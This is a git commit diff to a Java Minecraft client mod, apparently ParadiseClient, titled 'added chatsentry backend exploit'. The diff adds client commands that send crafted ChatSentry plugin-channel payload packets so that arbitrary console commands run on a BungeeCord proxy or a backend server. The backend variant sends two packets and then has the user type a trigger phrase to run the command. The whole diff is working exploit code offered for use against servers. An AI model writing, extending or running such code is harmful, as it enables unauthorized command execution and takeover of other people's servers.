f4558058be8a0926a36fa03c8dd5d382175e20d3
Milkthedev <128710385+SpigotRCE@users.noreply.github.com>
2024-09-16 10:26:24 +0530

    added chatsentry backend exploit

--- src/main/java/io/github/spigotrce/paradiseclientprivate/command/ChatSentryCommand.java
+++ src/main/java/io/github/spigotrce/paradiseclientprivate/command/ChatSentryCommand.java
@@ -4,18 +4,15 @@ import com.mojang.brigadier.arguments.StringArgumentType;
 import com.mojang.brigadier.builder.LiteralArgumentBuilder;
 import io.github.spigotrce.paradiseclientfabric.Helper;
 import io.github.spigotrce.paradiseclientfabric.command.Command;
-import io.github.spigotrce.paradiseclientprivate.packets.AuthMeVelocityPayloadPacket;
 import io.github.spigotrce.paradiseclientprivate.packets.ChatSentryPayloadPacket;
-import io.github.spigotrce.paradiseclientprivate.packets.SignedVelocityPayloadPacket;
 import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
 import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
 import net.minecraft.client.MinecraftClient;
-import net.minecraft.client.network.PlayerListEntry;
 import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
 
 public class ChatSentryCommand extends Command {
     public ChatSentryCommand(MinecraftClient minecraftClient) {
-        super("paradisechatsentry", "Executes bungee command through console!", minecraftClient);
+        super("chatsentry", "Executes bungee command through console!", minecraftClient);
     }
 
     @Override
@@ -25,14 +22,34 @@ public class ChatSentryCommand extends Command {
                     Helper.printChatMessage("Incomplete command!");
                     return SINGLE_SUCCESS;
                 })
-                .then(ClientCommandManager.argument("command", StringArgumentType.greedyString())
+                .then(literal("bungee")
+                        .then(ClientCommandManager.argument("command", StringArgumentType.greedyString())
+                                .executes(context -> {
+                                    Helper.sendPacket(new CustomPayloadC2SPacket(
+                                            new ChatSentryPayloadPacket(context.getArgument("command", String.class), true, "")
+                                    ));
+                                    Helper.printChatMessage("Chat sentry bungee payload packet sent!");
+                                    return SINGLE_SUCCESS;
+                                })
+                        ))
+                .then(literal("backend")
                         .executes(context -> {
-                            Helper.sendPacket(new CustomPayloadC2SPacket(
-                                    new ChatSentryPayloadPacket(context.getArgument("command", String.class))
-                            ));
-                            Helper.printChatMessage("Chat sentry payload packet sent!");
+                            Helper.printChatMessage("Incomplete command!");
                             return SINGLE_SUCCESS;
                         })
-                );
+                        .then(ClientCommandManager.argument("command", StringArgumentType.greedyString())
+                                .executes(context -> {
+                                    Helper.sendPacket(new CustomPayloadC2SPacket(
+                                            new ChatSentryPayloadPacket(context.getArgument("command", String.class), false, "config")
+                                    ));
+
+                                    Helper.sendPacket(new CustomPayloadC2SPacket(
+                                            new ChatSentryPayloadPacket(context.getArgument("command", String.class), false, "module")
+                                    ));
+                                    Helper.printChatMessage("Chat sentry backend payload packet sent! Type SpigotRCEOnTop to execute console command!");
+                                    return SINGLE_SUCCESS;
+                                })
+                        ));
+
     }
 }
